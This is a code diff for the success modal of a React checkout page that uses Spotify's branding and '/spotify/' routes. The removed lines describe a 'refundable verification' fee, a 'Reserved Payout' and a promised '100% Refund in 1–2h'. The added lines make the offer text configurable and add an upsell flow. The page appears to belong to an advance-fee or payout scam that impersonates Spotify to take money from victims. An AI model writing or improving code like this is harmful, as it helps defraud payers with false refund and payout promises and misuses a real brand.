+              {offerConfig.successModalTitle}
             </h3>
 
             <p className="text-sm text-gray-300 mb-4 leading-relaxed">
-              Your one-time refundable verification of <b className="text-white">${chargeAmountFormatted} USD</b> was successfully processed.
+              {offerConfig.successModalDescription}
             </p>
 
             <div className="p-4 rounded-2xl bg-black/50 border border-white/10 mb-5 text-left space-y-2">
               <div className="flex justify-between text-xs">
-                <span className="text-gray-400">Reserved Payout:</span>
-                <span className="font-bold text-[#1db954]">{balanceData.formatted} USD</span>
+                <span className="text-gray-400">Package Unlocked:</span>
+                <span className="font-bold text-white">{offerConfig.summaryTitle}</span>
               </div>
               <div className="flex justify-between text-xs">
-                <span className="text-gray-400">Verification Status:</span>
-                <span className="font-bold text-white">Active &amp; Approved</span>
+                <span className="text-gray-400">Amount Paid:</span>
+                <span className="font-bold text-[#1db954]">${chargeAmountFormatted} USD</span>
               </div>
               <div className="flex justify-between text-xs">
-                <span className="text-gray-400">Refundable Fee:</span>
-                <span className="font-bold text-blue-400">100% Refund in 1–2h</span>
+                <span className="text-gray-400">Account Status:</span>
+                <span className="font-bold text-[#1db954]">Active &amp; Unlocked</span>
               </div>
             </div>
 
             <div className="flex items-center justify-center gap-2 text-xs text-gray-400 mb-2">
               <RefreshCw className="w-3.5 h-3.5 animate-spin text-[#1db954]" />
-              <span>Redirecting to orientation &amp; onboarding...</span>
+              <span>
+                {isUpsellCheckout
+                  ? 'Returning to your Music Dashboard with your new upgrade...'
+                  : 'Redirecting to orientation & onboarding...'}
+              </span>
             </div>
 
             <Link
-              href="/spotify/welcome"
+              href={offerConfig.redirectUrl}
               className="mt-4 block w-full py-3.5 rounded-full bg-[#1db954] text-black font-extrabold text-sm hover:bg-[#1ed760] transition-colors"
             >
-              Continue to Welcome Page →
+              {offerConfig.successButtonLabel}
             </Link>
           </div>
         </div>
@@ -1333,5 +1507,19 @@ export default function PaymentPage() {
         </div>
       </footer>
     </div>
+  );
+}
+
+export default function PaymentPage() {
+  return (
+    <Suspense
+      fallback={
+        <div className="min-h-screen bg-[#070a08] flex items-center justify-center text-white text-xs">
+          Loading secure checkout...
+        </div>
+      }
+    >
+      <PaymentPageContent />
+    </Suspense>
   );
 }
